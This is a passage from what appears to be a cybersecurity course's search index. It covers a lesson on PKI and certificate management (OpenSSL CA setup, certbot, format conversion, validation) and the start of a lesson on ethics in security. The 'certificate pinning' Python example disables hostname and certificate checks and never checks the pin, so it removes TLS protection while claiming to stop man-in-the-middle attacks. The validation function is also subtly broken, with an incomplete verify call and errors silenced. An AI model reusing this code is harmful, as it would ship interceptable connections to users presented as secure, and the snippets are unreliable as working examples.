*.example.com # Webroot sudo certbot certonly --webroot -w /var/www/html \\ -d example.com Automatic Renewal # Test renewal sudo certbot renew --dry-run # Setup automatic renewal (cron) echo \"0 3 * * * /usr/bin/certbot renew --quiet\" | sudo crontab - # Or use systemd timer (already configured) sudo systemctl status certbot.timer Certificate Formats PEM (Privacy Enhanced Mail) -----BEGIN CERTIFICATE----- Base64 encoded certificate -----END CERTIFICATE----- Most common format, text-based. DER (Distinguished Encoding Rules) Binary format, compact. # PEM to DER openssl x509 -in cert.pem -outform DER -out cert.der # DER to PEM openssl x509 -in cert.der -inform DER -out cert.pem PKCS#12 / PFX Container format, includes certificate and private key. # Create PKCS12 openssl pkcs12 -export \\ -out certificate.p12 \\ -inkey private.key \\ -in certificate.crt \\ -certfile ca-chain.crt # Extract certificate openssl pkcs12 -in certificate.p12 \\ -nokeys -out certificate.crt # Extract private key openssl pkcs12 -in certificate.p12 \\ -nocerts -nodes -out private.key PKCS#7 Certificate chain format. # Create PKCS7 openssl crl2pkcs7 -nocrl \\ -certfile certificate.crt \\ -certfile ca-chain.crt \\ -out certificate.p7b # View PKCS7 openssl pkcs7 -print_certs -in certificate.p7b Certificate Validation Programmatic Validation from cryptography import x509 from cryptography.hazmat.backends import default_backend from cryptography.x509.oid import ExtensionOID import datetime def validate_certificate(cert_path, ca_path): \"\"\"Validate certificate\"\"\" # Load certificate with open(cert_path, 'rb') as f: cert = x509.load_pem_x509_certificate(f.read(), default_backend()) # Load CA certificate with open(ca_path, 'rb') as f: ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend()) # Check validity period now = datetime.datetime.utcnow() if now < cert.not_valid_before or now > cert.not_valid_after: print(\"Certificate expired or not yet valid\") return False # Verify signature try: ca_cert.public_key().verify( cert.signature, cert.tbs_certificate_bytes, # padding and algorithm depend on cert ) print(\"Signature valid\") except: print(\"Invalid signature\") return False # Check key usage try: key_usage = cert.extensions.get_extension_for_oid( ExtensionOID.KEY_USAGE ).value if key_usage.digital_signature and key_usage.key_encipherment: print(\"Key usage appropriate for TLS\") except: pass return True Common Validation Errors Expired certificate: Error: certificate has expired Fix: Renew certificate Wrong hostname: Error: certificate is not valid for example.com Fix: Add SAN for all domain names Self-signed certificate: Error: self signed certificate in certificate chain Fix: Add CA certificate to trust store Incomplete chain: Error: unable to get local issuer certificate Fix: Include intermediate certificates Certificate Pinning Why Pin Certificates? Certificate pinning ensures your application only trusts specific certificates, preventing MitM even with compromised CAs. Pin Public Keys import requests from requests.adapters import HTTPAdapter from requests.packages.urllib3.poolmanager import PoolManager import ssl import hashlib class PinnedHTTPAdapter(HTTPAdapter): def __init__(self, pin, *args, **kwargs): self.pin = pin super().__init__(*args, **kwargs) def init_poolmanager(self, *args, **kwargs): context = ssl.create_default_context() context.check_hostname = False context.verify_mode = ssl.CERT_NONE kwargs['ssl_context'] = context return super().init_poolmanager(*args, **kwargs) # Calculate pin def get_certificate_pin(hostname): import ssl cert = ssl.get_server_certificate((hostname, 443)) # Extract public key and hash # This is simplified - actual implementation more complex return hashlib.sha256(cert.encode()).hexdigest() # Use pinned connection session = requests.Session() pin = \"expected_certificate_hash\" session.mount('https://', PinnedHTTPAdapter(pin)) response = session.get('https://example.com') Best Practices Certificate management: - Use strong key sizes (2048+ bit RSA, 256+ bit ECC) - Short validity periods (90 days recommended) - Automate renewal - Monitor expiration dates - Test revocation procedures Key storage: - Protect private keys (chmod 400) - Use HSMs for root CA keys - Never transmit private keys unencrypted - Backup keys securely Operational: - Maintain certificate inventory - Set up expiration alerts - Document procedures - Test disaster recovery - Regular security audits Troubleshooting Common Issues Certificate chain order: # Correct order: # 1. Server certificate # 2. Intermediate certificate(s) # 3. Root certificate (optional) cat server.crt intermediate.crt > server-chain.crt Private key mismatch: # Check if certificate and key match openssl x509 -noout -modulus -in server.crt | openssl md5 openssl rsa -noout -modulus -in server.key | openssl md5 # Hashes should match Testing certificates: # Test with openssl openssl s_client -connect example.com:443 -showcerts # Check specific protocol openssl s_client -connect example.com:443 -tls1_2 # Verify chain openssl s_client -connect example.com:443 -CAfile ca-bundle.crt Key Takeaways PKI components: - Certificate Authorities issue and manage certificates - Certificates bind public keys to identities - Trust chains from root CAs to end entities - Revocation mechanisms (CRL, OCSP) Certificate lifecycle: 1. Key generation 2. CSR creation 3. CA signing 4. Deployment 5. Monitoring 6. Renewal 7. Revocation (if needed) Security considerations: - Protect private keys above all else - Validate certificates properly - Use short validity periods - Automate renewal processes - Monitor and alert on expiration Remember: - PKI is complex but essential - Automation reduces errors - Regular audits prevent issues - Documentation is critical - Test procedures regularly Understanding PKI is crucial for implementing secure systems. Whether you're setting up HTTPS, authenticating users, or signing code, PKI provides the trust framework that makes it all work.","title":"Lesson 7.3"},{"location":"LECTURES/unit7/lesson7-3/#pki-and-certificate-management","text":"Public Key Infrastructure (PKI) is the framework that enables secure communication across untrusted networks. Understanding PKI is essential for implementing HTTPS, email security, code signing, and authentication systems.","title":"PKI and Certificate Management"},{"location":"LECTURES/unit7/lesson7-3/#understanding-pki-components","text":"","title":"Understanding PKI Components"},{"location":"LECTURES/unit7/lesson7-3/#core-components","text":"Certificate Authority (CA): - Issues and signs digital certificates - Verifies identity before issuing - Maintains certificate revocation lists - Root of trust in PKI hierarchy Registration Authority (RA): - Verifies certificate requests - Intermediary between users and CA - Performs identity verification - Approves or rejects requests Certificate: - Digital document binding public key to identity - Signed by CA - Contains subject information, validity period, public key Certificate Revocation List (CRL): - List of revoked certificates - Published by CA - Checked during certificate validation OCSP (Online Certificate Status Protocol): - Real-time certificate status checking - Alternative to CRL - More efficient for validation","title":"Core Components"},{"location":"LECTURES/unit7/lesson7-3/#x509-certificates","text":"","title":"X.509 Certificates"},{"location":"LECTURES/unit7/lesson7-3/#certificate-structure","text":"Standard fields: Version: v3 Serial Number: unique identifier Signature Algorithm: RSA-SHA256 Issuer: CN=Example CA Validity: Not Before: 2024-01-01 Not After: 2025-01-01 Subject: CN=example.com Subject Public Key Info: Algorithm: RSA 2048 bit Public Key: ... Extensions: Subject Alternative Name: DNS:www.example.com Key Usage: Digital Signature, Key Encipherment Extended Key Usage: TLS Web Server Authentication Signature: ... Important fields: Common Name (CN): Primary identifier (domain name) Subject Alternative Names (SANs): Additional identifiers Key Usage: What the key can be used for Extended Key Usage: Specific purposes (web server, code signing) Authority Key Identifier: Links to issuing CA Subject Key Identifier: Unique key identifier","title":"Certificate Structure"},{"location":"LECTURES/unit7/lesson7-3/#reading-certificates","text":"# View certificate details openssl x509 -in certificate.crt -text -noout # Check certificate dates openssl x509 -in certificate.crt -dates -noout # View certificate subject openssl x509 -in certificate.crt -subject -noout # View certificate issuer openssl x509 -in certificate.crt -issuer -noout # Check certificate fingerprint openssl x509 -in certificate.crt -fingerprint -noout","title":"Reading Certificates"},{"location":"LECTURES/unit7/lesson7-3/#creating-a-certificate-authority","text":"","title":"Creating a Certificate Authority"},{"location":"LECTURES/unit7/lesson7-3/#root-ca-setup","text":"# Create directory structure mkdir -p ca/{root-ca,intermediate-ca}/{private,certs,newcerts,crl,csr} cd ca/root-ca # Generate root CA private key openssl genrsa -aes256 -out private/ca.key.pem 4096 chmod 400 private/ca.key.pem # Create root CA certificate openssl req -config openssl.cnf \\ -key private/ca.key.pem \\ -new -x509 -days 7300 -sha256 -extensions v3_ca \\ -out certs/ca.cert.pem # Verify root certificate openssl x509 -noout -text -in certs/ca.cert.pem","title":"Root CA Setup"},{"location":"LECTURES/unit7/lesson7-3/#root-ca-openssl-configuration","text":"# /root-ca/openssl.cnf [ ca ] default_ca = CA_default [ CA_default ] dir = /path/to/ca/root-ca certs = $dir/certs crl_dir = $dir/crl new_certs_dir = $dir/newcerts database = $dir/index.txt serial = $dir/serial RANDFILE = $dir/private/.rand private_key = $dir/private/ca.key.pem certificate = $dir/certs/ca.cert.pem crlnumber = $dir/crlnumber crl = $dir/crl/ca.crl.pem crl_extensions = crl_ext default_crl_days = 30 default_md = sha256 name_opt = ca_default cert_opt = ca_default default_days = 375 preserve = no policy = policy_strict [ policy_strict ] countryName = match stateOrProvinceName = match organizationName = match organizationalUnitName = optional commonName = supplied emailAddress = optional [ v3_ca ] subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always,issuer basicConstraints = critical, CA:true keyUsage = critical, digitalSignature, cRLSign, keyCertSign","title":"Root CA OpenSSL Configuration"},{"location":"LECTURES/unit7/lesson7-3/#intermediate-ca-setup","text":"cd /path/to/ca/intermediate-ca # Generate intermediate key openssl genrsa -aes256 -out private/intermediate.key.pem 4096 chmod 400 private/intermediate.key.pem # Create intermediate CSR openssl req -config openssl.cnf -new -sha256 \\ -key private/intermediate.key.pem \\ -out csr/intermediate.csr.pem # Sign intermediate certificate with root CA cd ../root-ca openssl ca -config openssl.cnf -extensions v3_intermediate_ca \\ -days 3650 -notext -md sha256 \\ -in ../intermediate-ca/csr/intermediate.csr.pem \\ -out ../intermediate-ca/certs/intermediate.cert.pem # Verify intermediate certificate openssl verify -CAfile certs/ca.cert.pem \\ ../intermediate-ca/certs/intermediate.cert.pem # Create certificate chain file cat ../intermediate-ca/certs/intermediate.cert.pem \\ certs/ca.cert.pem > ../intermediate-ca/certs/ca-chain.cert.pem","title":"Intermediate CA Setup"},{"location":"LECTURES/unit7/lesson7-3/#issuing-server-certificates","text":"","title":"Issuing Server Certificates"},{"location":"LECTURES/unit7/lesson7-3/#generate-server-certificate","text":"cd /path/to/ca/intermediate-ca # Generate server private key openssl genrsa -out private/server.key.pem 2048 chmod 400 private/server.key.pem # Create certificate signing request openssl req -config openssl.cnf \\ -key private/server.key.pem \\ -new -sha256 -out csr/server.csr.pem # Sign server certificate openssl ca -config openssl.cnf \\ -extensions server_cert -days 375 -notext -md sha256 \\ -in csr/server.csr.pem \\ -out certs/server.cert.pem # Verify server certificate openssl verify -CAfile certs/ca-chain.cert.pem \\ certs/server.cert.pem","title":"Generate Server Certificate"},{"location":"LECTURES/unit7/lesson7-3/#server-certificate-with-san","text":"# Create config with Subject Alternative Names cat > server.cnf << EOF [req] distinguished_name = req_distinguished_name req_extensions = v3_req [req_distinguished_name] CN = example.com [v3_req] subjectAltName = @alt_names [alt_names] DNS.1 = example.com DNS.2 = www.example.com DNS.3 = api.example.com IP.1 = 192.168.1.100 EOF # Generate CSR with SANs openssl req -new -key server.key.pem \\ -out server.csr.pem \\ -config server.cnf # Sign with SANs openssl x509 -req -in server.csr.pem \\ -CA ca-chain.cert.pem -CAkey ca.key.pem \\ -CAcreateserial -out server.cert.pem \\ -days 365 -sha256 \\ -extfile server.cnf -extensions v3_req","title":"Server Certificate with SAN"},{"location":"LECTURES/unit7/lesson7-3/#client-certificates","text":"","title":"Client Certificates"},{"location":"LECTURES/unit7/lesson7-3/#generate-client-certificate","text":"# Generate client private key openssl genrsa -out client.key.pem 2048 # Create client CSR openssl req -new -key client.key.pem \\ -out client.csr.pem \\ -subj \"/C=US/ST=State/O=Org/CN=user@example.com\" # Sign client certificate openssl ca -config openssl.cnf \\ -extensions usr_cert -days 375 -notext -md sha256 \\ -in client.csr.pem \\ -out client.cert.pem # Create PKCS12 file for client openssl pkcs12 -export \\ -out client.p12 \\ -inkey client.key.pem \\ -in client.cert.pem \\ -certfile ca-chain.cert.pem","title":"Generate Client Certificate"},{"location":"LECTURES/unit7/lesson7-3/#using-client-certificates","text":"Apache configuration: SSLVerifyClient require SSLVerifyDepth 2 SSLCACertificateFile /path/to/ca-chain.cert.pem Nginx configuration: ssl_client_certificate /path/to/ca-chain.cert.pem; ssl_verify_client on; ssl_verify_depth 2; Python requests: import requests response = requests.get( 'https://example.com', cert=('client.cert.pem', 'client.key.pem'), verify='ca-chain.cert.pem' )","title":"Using Client Certificates"},{"location":"LECTURES/unit7/lesson7-3/#certificate-revocation","text":"","title":"Certificate Revocation"},{"location":"LECTURES/unit7/lesson7-3/#creating-crl","text":"# Revoke certificate openssl ca -config openssl.cnf \\ -revoke certs/server.cert.pem # Generate CRL openssl ca -config openssl.cnf \\ -gencrl -out crl/ca.crl.pem # View CRL openssl crl -in crl/ca.crl.pem -noout -text","title":"Creating CRL"},{"location":"LECTURES/unit7/lesson7-3/#ocsp-responder","text":"# Start OCSP responder openssl ocsp -port 8080 \\ -index index.txt \\ -CA certs/ca-chain.cert.pem \\ -rkey private/ca.key.pem \\ -rsigner certs/ca.cert.pem # Check certificate status openssl ocsp -CAfile certs/ca-chain.cert.pem \\ -url http://localhost:8080 \\ -resp_text \\ -issuer certs/intermediate.cert.pem \\ -cert certs/server.cert.pem","title":"OCSP Responder"},{"location":"LECTURES/unit7/lesson7-3/#lets-encrypt-free-certificates","text":"","title":"Let's Encrypt (Free Certificates)"},{"location":"LECTURES/unit7/lesson7-3/#certbot-installation","text":"# Install certbot sudo apt install certbot python3-certbot-apache # Or for nginx sudo apt install certbot python3-certbot-nginx","title":"Certbot Installation"},{"location":"LECTURES/unit7/lesson7-3/#obtaining-certificates","text":"# Apache sudo certbot --apache -d example.com -d www.example.com # Nginx sudo certbot --nginx -d example.com -d www.example.com # Standalone (no web server) sudo certbot certonly --standalone -d example.com # DNS challenge (for wildcard) sudo certbot certonly --manual --preferred-challenges dns \\ -d example.com -d *.example.com # Webroot sudo certbot certonly --webroot -w /var/www/html \\ -d example.com","title":"Obtaining Certificates"},{"location":"LECTURES/unit7/lesson7-3/#automatic-renewal","text":"# Test renewal sudo certbot renew --dry-run # Setup automatic renewal (cron) echo \"0 3 * * * /usr/bin/certbot renew --quiet\" | sudo crontab - # Or use systemd timer (already configured) sudo systemctl status certbot.timer","title":"Automatic Renewal"},{"location":"LECTURES/unit7/lesson7-3/#certificate-formats","text":"","title":"Certificate Formats"},{"location":"LECTURES/unit7/lesson7-3/#pem-privacy-enhanced-mail","text":"-----BEGIN CERTIFICATE----- Base64 encoded certificate -----END CERTIFICATE----- Most common format, text-based.","title":"PEM (Privacy Enhanced Mail)"},{"location":"LECTURES/unit7/lesson7-3/#der-distinguished-encoding-rules","text":"Binary format, compact. # PEM to DER openssl x509 -in cert.pem -outform DER -out cert.der # DER to PEM openssl x509 -in cert.der -inform DER -out cert.pem","title":"DER (Distinguished Encoding Rules)"},{"location":"LECTURES/unit7/lesson7-3/#pkcs12-pfx","text":"Container format, includes certificate and private key. # Create PKCS12 openssl pkcs12 -export \\ -out certificate.p12 \\ -inkey private.key \\ -in certificate.crt \\ -certfile ca-chain.crt # Extract certificate openssl pkcs12 -in certificate.p12 \\ -nokeys -out certificate.crt # Extract private key openssl pkcs12 -in certificate.p12 \\ -nocerts -nodes -out private.key","title":"PKCS#12 / PFX"},{"location":"LECTURES/unit7/lesson7-3/#pkcs7","text":"Certificate chain format. # Create PKCS7 openssl crl2pkcs7 -nocrl \\ -certfile certificate.crt \\ -certfile ca-chain.crt \\ -out certificate.p7b # View PKCS7 openssl pkcs7 -print_certs -in certificate.p7b","title":"PKCS#7"},{"location":"LECTURES/unit7/lesson7-3/#certificate-validation","text":"","title":"Certificate Validation"},{"location":"LECTURES/unit7/lesson7-3/#programmatic-validation","text":"from cryptography import x509 from cryptography.hazmat.backends import default_backend from cryptography.x509.oid import ExtensionOID import datetime def validate_certificate(cert_path, ca_path): \"\"\"Validate certificate\"\"\" # Load certificate with open(cert_path, 'rb') as f: cert = x509.load_pem_x509_certificate(f.read(), default_backend()) # Load CA certificate with open(ca_path, 'rb') as f: ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend()) # Check validity period now = datetime.datetime.utcnow() if now < cert.not_valid_before or now > cert.not_valid_after: print(\"Certificate expired or not yet valid\") return False # Verify signature try: ca_cert.public_key().verify( cert.signature, cert.tbs_certificate_bytes, # padding and algorithm depend on cert ) print(\"Signature valid\") except: print(\"Invalid signature\") return False # Check key usage try: key_usage = cert.extensions.get_extension_for_oid( ExtensionOID.KEY_USAGE ).value if key_usage.digital_signature and key_usage.key_encipherment: print(\"Key usage appropriate for TLS\") except: pass return True","title":"Programmatic Validation"},{"location":"LECTURES/unit7/lesson7-3/#common-validation-errors","text":"Expired certificate: Error: certificate has expired Fix: Renew certificate Wrong hostname: Error: certificate is not valid for example.com Fix: Add SAN for all domain names Self-signed certificate: Error: self signed certificate in certificate chain Fix: Add CA certificate to trust store Incomplete chain: Error: unable to get local issuer certificate Fix: Include intermediate certificates","title":"Common Validation Errors"},{"location":"LECTURES/unit7/lesson7-3/#certificate-pinning","text":"","title":"Certificate Pinning"},{"location":"LECTURES/unit7/lesson7-3/#why-pin-certificates","text":"Certificate pinning ensures your application only trusts specific certificates, preventing MitM even with compromised CAs.","title":"Why Pin Certificates?"},{"location":"LECTURES/unit7/lesson7-3/#pin-public-keys","text":"import requests from requests.adapters import HTTPAdapter from requests.packages.urllib3.poolmanager import PoolManager import ssl import hashlib class PinnedHTTPAdapter(HTTPAdapter): def __init__(self, pin, *args, **kwargs): self.pin = pin super().__init__(*args, **kwargs) def init_poolmanager(self, *args, **kwargs): context = ssl.create_default_context() context.check_hostname = False context.verify_mode = ssl.CERT_NONE kwargs['ssl_context'] = context return super().init_poolmanager(*args, **kwargs) # Calculate pin def get_certificate_pin(hostname): import ssl cert = ssl.get_server_certificate((hostname, 443)) # Extract public key and hash # This is simplified - actual implementation more complex return hashlib.sha256(cert.encode()).hexdigest() # Use pinned connection session = requests.Session() pin = \"expected_certificate_hash\" session.mount('https://', PinnedHTTPAdapter(pin)) response = session.get('https://example.com')","title":"Pin Public Keys"},{"location":"LECTURES/unit7/lesson7-3/#best-practices","text":"Certificate management: - Use strong key sizes (2048+ bit RSA, 256+ bit ECC) - Short validity periods (90 days recommended) - Automate renewal - Monitor expiration dates - Test revocation procedures Key storage: - Protect private keys (chmod 400) - Use HSMs for root CA keys - Never transmit private keys unencrypted - Backup keys securely Operational: - Maintain certificate inventory - Set up expiration alerts - Document procedures - Test disaster recovery - Regular security audits","title":"Best Practices"},{"location":"LECTURES/unit7/lesson7-3/#troubleshooting","text":"","title":"Troubleshooting"},{"location":"LECTURES/unit7/lesson7-3/#common-issues","text":"Certificate chain order: # Correct order: # 1. Server certificate # 2. Intermediate certificate(s) # 3. Root certificate (optional) cat server.crt intermediate.crt > server-chain.crt Private key mismatch: # Check if certificate and key match openssl x509 -noout -modulus -in server.crt | openssl md5 openssl rsa -noout -modulus -in server.key | openssl md5 # Hashes should match Testing certificates: # Test with openssl openssl s_client -connect example.com:443 -showcerts # Check specific protocol openssl s_client -connect example.com:443 -tls1_2 # Verify chain openssl s_client -connect example.com:443 -CAfile ca-bundle.crt","title":"Common Issues"},{"location":"LECTURES/unit7/lesson7-3/#key-takeaways","text":"PKI components: - Certificate Authorities issue and manage certificates - Certificates bind public keys to identities - Trust chains from root CAs to end entities - Revocation mechanisms (CRL, OCSP) Certificate lifecycle: 1. Key generation 2. CSR creation 3. CA signing 4. Deployment 5. Monitoring 6. Renewal 7. Revocation (if needed) Security considerations: - Protect private keys above all else - Validate certificates properly - Use short validity periods - Automate renewal processes - Monitor and alert on expiration Remember: - PKI is complex but essential - Automation reduces errors - Regular audits prevent issues - Documentation is critical - Test procedures regularly Understanding PKI is crucial for implementing secure systems. Whether you're setting up HTTPS, authenticating users, or signing code, PKI provides the trust framework that makes it all work.","title":"Key Takeaways"},{"location":"LECTURES/unit8/lesson8-1/","text":"The Ethical Side of Cybersecurity You now have significant knowledge that could be used for harm. You understand networks, can write scripts, know how to capture packets, and comprehend encryption. This lesson is about the responsibility that comes with that knowledge. Why Ethics Matter in Cybersecurity Cybersecurity skills are powerful. The same techniques used to defend systems can be used to attack them. The difference between a security professional and a criminal often comes down to permission, intent, and ethical boundaries. Consider: - The skills to test for SQL injection can also exploit vulnerable websites - The ability to capture network traffic can intercept private communications - Knowledge of malware can be used to create or stop it - Access control expertise can secure systems or bypass them You will be tempted. You'll find vulnerabilities in systems. You'll have access to sensitive data. You'll have opportunities to abuse your skills. Your ethical foundation is what will guide your decisions when no one is watching. Core Ethical Principles 1. Do No Harm The first rule: don't cause damage. This means: - Don't access systems without authorization - Don't modify data you're not supposed to - Don't disrupt services - Don't create malware for malicious purposes - Don't steal information - Don't facilitate harm to others Even if you could easily hack something, that doesn't make it right or legal. 2. Respect Privacy People have a right to privacy. As a security professional, you'll often have access to private information: - User credentials - Personal communications - Financial data - Medical records - Private photos and documents You must protect this information , even if it's technically within your power to access or share it. Just because you can see someone's data doesn't mean you should . 3. Get Permission First Never test security without explicit permission. This cannot be overstated. Authorized testing: - Written permission from system owner - Clearly defined scope - Time boundaries - Rules of engagement - Point of contact Unauthorized testing: - \"But I was helping!\" is not a legal defense - Can result in criminal charges - Can ruin your career - Can cause real damage If you find a vulnerability accidentally, report it responsibly\u2014don't exploit it. 4. Responsible Disclosure When you discover a vulnerability: Good approach (Responsible Disclosure): 1. Document the vulnerability 2. Contact the vendor/owner through proper channels 3. Give them reasonable time to fix it (usually 90 days) 4. Don't publicly disclose until patched 5. May disclose after patch or deadline Bad approaches: - Full disclosure : Immediately publicizing vulnerability before patch - Extortion : Demanding payment for vulnerability info - Weaponizing : Selling to criminals or nation-states - Silent exploitation : Using vulnerability without telling anyone Coordinated disclosure is the industry standard\u2014work with vendors to fix issues before they're exploited. 5. Transparency and Honesty Be honest about: - Your findings in security assessments - Your capabilities and limitations - Conflicts of interest - When you make mistakes Don't: - Exaggerate threats to get business - Hide vulnerabilities you're supposed to report - Claim credit for others' work - Lie about credentials or experience Your reputation is built on trust. One act of dishonesty can destroy a career. Legal Frameworks Ethics and law overlap but aren't identical. Something can be unethical but legal, or ethical but illegal in certain jurisdictions. However, security professionals must understand the legal landscape. Computer Fraud and Abuse Act (CFAA) - USA The primary US law governing computer crimes: - Accessing computers without authorization - Exceeding authorized access - Causing damage to computer systems - Trafficking in passwords - Threatening to damage computers (extortion) Penalties : Fines and imprisonment, severity depends on damage and intent Controversial aspects : Vague language has led to concerning prosecutions, including researchers testing security. Computer Misuse Act - UK Similar to CFAA: - Unauthorized access to computer material - Unauthorized access with intent to commit further offenses - Unauthorized modification of computer material - Making, supplying, or obtaining tools for computer misuse Other Relevant Laws GDPR (General Data Protection Regulation) - EU: - Strict data protection requirements - Heavy fines for breaches - Right to be forgotten - Data portability HIPAA - USA healthcare data: - Protects medical information - Strict access controls required - Severe penalties for violations COPPA - USA children's privacy: - Protects children under 13 online - Parental consent requirements State/local laws : Many jurisdictions have additional computer crime laws International Considerations Cybersecurity is global, but laws are local: - Actions legal in your country may be illegal elsewhere - Accessing systems in another country can violate their laws - Extradition treaties may apply - Corporate espionage is illegal internationally Always understand the legal jurisdiction of systems you're working with. Professional Codes of Conduct Several organizations provide ethical frameworks for cybersecurity professionals: (ISC)\u00b2 Code of Ethics For CISSP and other certifications: 1. Protect society, the common good, necessary public trust and confidence, and the infrastructure 2. Act honorably, honestly, justly, responsibly, and legally 3. Provide diligent and competent service to principals 4. Advance and protect the profession EC-Council Code of Ethics For CEH (Certified Ethical Hacker): - Keep private information confidential - Not use hacking knowledge for personal gain - Not cause damage to clients' systems - Inform organizations of vulnerabilities - Not violate intellectual property rights ACM Code of Ethics For computer professionals: - Contribute to society and human well-being - Avoid harm - Be honest and trustworthy - Be fair and take action not to discriminate - Respect privacy - Honor confidentiality These frameworks help guide decisions in gray areas. Ethical Dilemmas in Cybersecurity Let's examine some realistic scenarios: Scenario 1: The Accidental Discovery You're browsing a company website and notice a URL parameter. Out of curiosity, you change it and discover you can access other users' account information. No one knows you found this. Ethical considerations: - You didn't intend to find this, but now you have - Other malicious actors could find it too - Users' data is at risk - You've technically accessed unauthorized data Right approach: 1. Stop accessing the vulnerability immediately 2. Document what you found (screenshots, URLs) 3. Report to the company through security@company.com or responsible disclosure program 4. Don't access further data or share the vulnerability 5. Give them time to fix before any public disclosure Wrong approaches: - \"Testing\" further to see how bad it is (unauthorized access) - Telling friends or posting on social media - Ignoring it (users remain at risk) - Demanding money to disclose it (extortion) Scenario 2: The Security Job Offer A company offers you a job to test their competitor's security\u2014without the competitor's knowledge. Ethical considerations: - This is corporate espionage - It's illegal - It's unethical - Could destroy your career and lead to criminal charges Right approach: Decline immediately. This is criminal activity, regardless of how it's framed. Red flags: - Testing systems you don't own - No written authorization - Targeting competitors - Requests for \"gray area\" work Scenario 3: The Insecure Client During a penetration test, you find the client's CEO has terrible password hygiene and is accessing adult websites on company time. Ethical considerations: - Your job is security testing, not morality policing - CEO's personal behavior isn't your business unless it's a security risk - You have a duty to report security issues - You shouldn't gossip or shame Right approach: - Report weak passwords as security findings - If adult sites are malicious or violate policy, report the security risk - Don't mention personal details that aren't relevant to security - Maintain confidentiality Scenario 4: The National Security Request A government agency asks you to create a backdoor in your company's encryption software \"for national security.\" Ethical considerations: - Backdoors undermine security for everyone - You'd be compromising your users - May be legally required in some jurisdictions - May violate users' trust and privacy Considerations: - Consult with company legal team - Understand legal obligations - Consider resigning if you can't ethically comply - Whistleblower protections may apply This is genuinely complex and depends on jurisdiction, laws, and personal values. Scenario 5: The Vulnerability in Your Own Product You discover a severe vulnerability in software your team shipped. Fixing it is expensive and time-consuming. Your manager wants to delay. Ethical considerations: - Users are at risk - Disclosure could hurt company reputation - You have responsibility to both employer and users - Legal liability if breach occurs Right approach: - Document the vulnerability - Advocate strongly for immediate fix - Escalate if manager refuses - Consider whistleblower options if company ignores serious risk - Never help cover up serious vulnerabilities The Gray Areas Not everything in cybersecurity is black and white: Security Research Is it ethical to: - Probe your own systems? (Yes, with permission) - Test open-source software for vulnerabilities? (Yes, responsibly) - Reverse engineer malware? (Yes, for defense) - Examine protocols and find flaws? (Yes, with responsible disclosure) - Buy zero-day vulnerabilities? (Complicated\u2014depends on use) - Create proof-of-concept exploits? (Yes, if not weaponized) Offensive Security Can you ethically: - Perform penetration testing? (Yes, with authorization) - Develop exploit tools? (Yes, if used ethically) - Simulate attacks? (Yes, in controlled environments) - Teach exploitation techniques? (Yes, education is important) - Participate in red teaming? (Yes, with proper agreements) Privacy vs. Security Sometimes these conflict: - Monitoring employee activity (security vs. privacy) - Encryption backdoors (security of some vs. privacy of all) - Data retention (incident investigation vs. data minimization) - Surveillance programs (national security vs. civil liberties) These require careful balancing and informed debate. Building Your Ethical Framework How do you make ethical decisions? The Four-Way Test Ask yourself: 1. Is it the truth? Am I being honest? 2. Is it fair to all concerned? Am I treating everyone fairly? 3. Will it build goodwill and better relationships? Am I helping or harming trust? 4. Will it be beneficial to all concerned? Is this a net positive? The Publicity Test Would you be comfortable with your actions appearing on the front page of a newspaper with your name attached? The Reversibility Test If someone did this to you or your organization, how would you feel? The Professional Test Would respected professionals in your field approve of this action? The Legal Test Is this legal in all relevant jurisdictions? If you're uncertain, err on the side of caution and seek advice. Ethical Decision-Making Process When facing an ethical dilemma: Identify the issue : What's the ethical question? Gather information : What are the facts? What are the laws? Identify stakeholders : Who is affected? Consider alternatives : What are your options? Evaluate consequences : What happens with each option? Make a decision : Based on ethical principles and professional standards Implement : Act on your decision Reflect : Was it the right choice? What did you learn? Document your reasoning. If questioned later, you can explain your thinking. Professional Responsibility As your skills grow, so does your responsibility: Duty to Clients/Employers Perform work competently Maintain confidentiality Act in their best interest Report findings honestly Stay within scope of engagement Duty to Society Don't facilitate criminal activity Protect critical infrastructure Contribute to security knowledge Mentor others responsibly Advocate for better security practices Duty to the Profession Uphold professional standards Report unethical behavior Continue learning and improving Share knowledge appropriately Don't undermine trust in the field Duty to Yourself Don't compromise your integrity Don't accept work you're not qualified for Maintain work-life balance Seek support when facing ethical dilemmas Know when to walk away Red Flags and Warning Signs Situations that should concern you: Requests that: - Violate laws or professional codes - Target systems without authorization - Ask you to lie or conceal information - Involve malicious intent - Lack proper documentation - Require secrecy from normal oversight - Pressure you to act without time to think Trust your instincts. If something feels wrong, it probably is. Seek advice from mentors, legal counsel, or professional organizations. Career Implications Ethics isn't just philosophical\u2014it's practical: Good ethics: - Build reputation and trust - Create career opportunities - Lead to referrals and recommendations - Provide job satisfaction - Enable you to sleep at night Poor ethics: - Destroy careers permanently - Lead to criminal charges - Result in professional blacklisting - Cause personal and family hardship - Eliminate future opportunities The cybersecurity community is smaller than you think. Reputation matters. Ethical Hacking vs. Criminal Hacking Let's be clear about the distinction: Ethical Hacker (White Hat): - Has explicit permission - Works within defined scope - Reports findings to owners - Follows responsible disclosure - Aims to improve security - Respects privacy and laws Criminal Hacker (Black Hat): - No permission - Targets for personal gain - Steals or damages data - Exploits vulnerabilities - Operates illegally - Causes harm Gray Hat: - No permission but no malicious intent - Discovers vulnerabilities and reports them - Still illegal in most jurisdictions - Risky and not recommended Your goal should always be to operate as a white hat professional. Real-World Examples Aaron Swartz : Downloaded academic articles from JSTOR. Faced disproportionate criminal charges under CFAA. Tragic case that sparked debate about computer fraud laws. Marcus Hutchins : Security researcher who stopped WannaCry ransomware. Later charged with creating malware years earlier. Eventually pleaded guilty but received no jail time. Complex case involving past mistakes and later redemption. Weev : Found vulnerability in AT&T website exposing iPad users' emails. Convicted under CFAA, conviction later overturned. Controversial case about what constitutes \"unauthorized access.\" These cases show the complexity and serious consequences of operating in ethical gray areas. Moving Forward As you continue in cybersecurity: Know the laws in your jurisdiction Follow professional codes of conduct Get everything in writing before testing systems Think before you act - pause when facing ethical dilemmas Seek mentorship from experienced ethical professionals Stay informed about legal and ethical developments Contribute positively to the security community Speak up when you see unethical behavior Document your decisions and reasoning Never compromise your integrity Conclusion Ethics in cybersecurity isn't about following arbitrary rules. It's about: - Respecting people's rights and privacy - Using power responsibly - Building trust - Contributing to a safer digital world - Maintaining professional standards You have or will have significant power. Systems will be vulnerable to you. Private information will be accessible. Organizations will trust you. How you handle that power defines who you are as a professional. The skills you're learning are tools. Like any tool, they can build or destroy. Your ethical framework determines which. Choose wisely. Your decisions will affect not just your career, but the lives of others and the security of systems we all depend on. Remember : The most important security 